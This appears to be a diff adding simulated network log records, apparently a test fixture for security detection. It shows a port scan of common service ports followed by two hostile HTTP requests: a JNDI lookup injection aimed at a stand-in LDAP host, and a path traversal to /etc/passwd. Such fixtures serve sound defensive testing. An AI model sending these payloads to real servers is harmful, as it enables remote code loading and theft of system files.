@@ -1,0 +1,12 @@
+{"timestamp":"2026-08-30T08:00:00Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52000,"dst_port":22,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:01Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52001,"dst_port":80,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:02Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52002,"dst_port":443,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:03Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52003,"dst_port":445,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:04Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52004,"dst_port":3306,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:05Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52005,"dst_port":5432,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:06Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52006,"dst_port":6379,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:07Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52007,"dst_port":8080,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:08Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52008,"dst_port":9200,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:09Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52009,"dst_port":27017,"protocol":"TCP","tcp_flags":"S","bytes":60,"simulated":true}
+{"timestamp":"2026-08-30T08:00:10Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52100,"dst_port":8080,"protocol":"HTTP","http_method":"GET","http_host":"demo.local","http_uri":"/search?q=${jndi:ldap://example.invalid/a}","http_status":400,"bytes":412,"simulated":true}
+{"timestamp":"2026-08-30T08:00:11Z","src_ip":"198.51.100.24","dst_ip":"10.0.0.8","src_port":52101,"dst_port":8080,"protocol":"HTTP","http_method":"GET","http_host":"demo.local","http_uri":"/../../etc/passwd","http_status":403,"bytes":380,"simulated":true}
